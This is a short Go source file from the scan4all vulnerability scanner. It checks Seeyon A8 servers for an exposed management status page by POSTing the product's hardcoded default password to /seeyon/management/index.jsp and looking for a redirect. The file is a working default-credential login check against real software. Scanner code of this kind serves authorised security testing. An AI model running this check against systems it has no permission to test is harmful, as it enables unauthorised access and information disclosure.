package seeyon

import (
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
)

//A8 状态监控页面信息泄露

func ManagementStatus(u string) bool {
	if req, err := util.HttpRequset(u+"/seeyon/management/index.jsp", "POST", "password=WLCCYBD@SEEYON", false, nil); err == nil {
		if req.StatusCode == 302 && util.StrContains(req.Location, "status") {
			util.GoPocLog(fmt.Sprintf("Found vuln seeyon ManagementStatus|pssword:WLCCYBD@SEEYON|%s\n", u+"/seeyon/management/index.jsp"))
			return true
		}
	}
	return false
}
